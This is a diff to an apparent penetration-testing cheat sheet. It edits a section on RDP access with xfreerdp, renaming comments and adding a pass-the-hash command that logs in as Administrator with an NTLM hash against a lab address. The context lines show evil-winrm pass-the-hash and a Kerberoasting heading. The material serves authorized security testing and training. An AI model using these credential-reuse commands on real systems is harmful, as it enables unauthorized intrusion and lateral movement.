@@ -386,11 +386,14 @@ evil-winrm -i 172.16.150.10 -u Administrator -H 1a06b4248879e68a498d3bac51bf91c9
 ### xfreerdp - Access RDP with Password or Pass-the-Hash
 ```shell
 # Create "/home/kali/share" before using it - This folder will allow us to move files easily from inside the xfreerdp session
-# Example 1
+# Connection with share for file transfers
 xfreerdp /u:Administrator /p:'Password123!' /v:172.16.150.10 /drive:share,/home/kali/share
 sudo xfreerdp /u:Administrator /p:'Password123!' /v:172.16.150.10 /drive:share,/home/kali/share
-# Example 2
+# With extra parameters
 xfreerdp /cert-ignore /auto-reconnect /h:1000 /w:1600 /v:172.16.150.10 /u:Administrator /p:'Password123!' /d:vorkharium.com /drive:share,/home/kali/share
+# Using hash
+xfreerdp /u:Administrator /pth:'1a06b4248879e68a498d3bac51bf91c9' /v:172.16.150.10 /drive:share,/home/kali/share
+
 ```
 ### Kerberoasting with Impacket
 ```shell
